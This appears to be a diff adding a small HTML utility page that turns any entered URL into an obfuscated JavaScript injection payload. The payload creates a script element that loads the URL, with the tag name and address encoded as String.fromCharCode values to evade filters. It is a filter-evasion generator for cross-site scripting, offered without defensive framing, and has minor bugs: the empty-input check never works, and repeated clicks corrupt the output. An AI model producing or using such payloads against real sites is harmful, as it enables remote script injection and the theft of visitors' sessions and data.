@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>transform</title>
+	<style type="text/css"></style>
+</head>
+<body>
+	<input type="text" id="link" placeholder="input link" style="width:500px"/>
+	<button id="go">Go</button>
+	<br/>
+	<textarea id="result" style="width:498px;height:200px;margin-top:5px;"></textarea>
+
+	<script type="text/javascript">
+	
+	(function(){
+
+		var $ = function(id){
+			return document.getElementById(id);
+		}
+
+		var link = $('link'),
+			go = $('go'),
+			result = $('result'),
+			templateHead = 'window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(',
+			templateTail = ');document.body.appendChild(window.s)';
+
+		var transform= function(data){
+			for(var i = 0,len = data.length;i<len;i++){
+				templateHead += data.charCodeAt(i);
+				if(i != len-1) templateHead+=',';
+			}
+			return templateHead + templateTail;
+		}
+
+		go.addEventListener('click',function(e){
+			if(!link){
+				e.preventDefault();
+				return;
+			}
+
+			result.innerText = transform(link.value);
+		})
+
+	})()
+
+	</script>
+</body>
+</html>
